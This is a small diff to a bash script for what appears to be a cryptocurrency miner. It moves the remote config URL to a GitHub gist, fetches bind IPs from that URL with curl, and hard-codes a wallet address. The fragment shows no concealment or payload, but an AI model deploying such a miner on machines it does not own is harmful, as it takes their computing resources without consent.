@@ -1,6 +1,6 @@
 #!/bin/bash
 
-CONFIG_URL="https://raw.githubusercontent.com/Luisbuttocks/Miner_resources/refs/heads/main/Config86.json"
+CONFIG_URL="https://gist.githubusercontent.com/Luisbuttocks/ac7b5ada6be6cd004958c0809b12ebdc/raw/bd79d67f34fbb3b90c6b686fc2f545731f633988/gistfile1.txt"
 WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"
 
 BIND_IPS=$(curl -s $CONFIG_URL)
